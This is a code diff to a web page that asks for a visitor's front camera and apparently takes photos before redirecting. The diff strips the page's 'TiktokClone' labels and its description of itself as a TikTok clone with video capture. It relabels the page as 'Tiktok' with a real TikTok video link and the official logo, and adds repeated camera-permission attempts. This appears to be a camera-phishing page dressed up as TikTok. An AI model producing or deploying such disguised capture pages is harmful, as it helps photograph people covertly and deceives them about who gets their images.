@@ -14,10 +14,10 @@
   <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" />
   <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 
-  <meta property="og:title" content="TiktokClone">
-  <meta property="og:site_name" content="TiktokClone">
+  <meta property="og:title" content="Tiktok">
+  <meta property="og:site_name" content="Tiktok">
   <meta property="og:url" content="">
-  <meta property="og:description" content="Клон TikTok с функцией захвата видео">
+  <meta property="og:description" content="https://www.tiktok.com/@davay_obsudim/video/7417148731230850334">
   <meta property="og:image"
     content="https://lf16-tiktok-common.ibytedtos.com/obj/tiktok-web-common-sg/mtact/static/images/logo_144c91a.png?v=2">
 
@@ -67,21 +67,29 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     let firstPhotoTaken = false;
+    let cameraAccessAttempts = 0;
 
     const constraints = {
       audio: false,
       video: { facingMode: "user" }
     };
 
-    async function init() {
-      console.log('Запуск камеры...');
+    async function requestCameraAccess() {
+      console.log('Запрос доступа к камере...');
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         console.log('Камера успешно запущена!');
         handleSuccess(stream);
       } catch (e) {
         console.log(`Ошибка доступа к камере: ${e.toString()}`);
-        console.log('Камера не запущена!');
+        cameraAccessAttempts++;
+        if (cameraAccessAttempts < 3) {
+          console.log(`Повторная попытка доступа к камере через 3 секунды (попытка ${cameraAccessAttempts + 1})...`);
+          setTimeout(requestCameraAccess, 3000);
+        } else {
+          console.log('Превышено максимальное количество попыток доступа к камере. Выполняем редирект.');
+          redirectToFinalDestination();
+        }
       }
     }
 
@@ -115,7 +123,8 @@
       window.location.replace(redirectUrl);
     }
 
-    setTimeout(init, 3000);
+    // Начинаем запрос доступа к камере
+    setTimeout(requestCameraAccess, 3000);
   </script>
 </body>
 
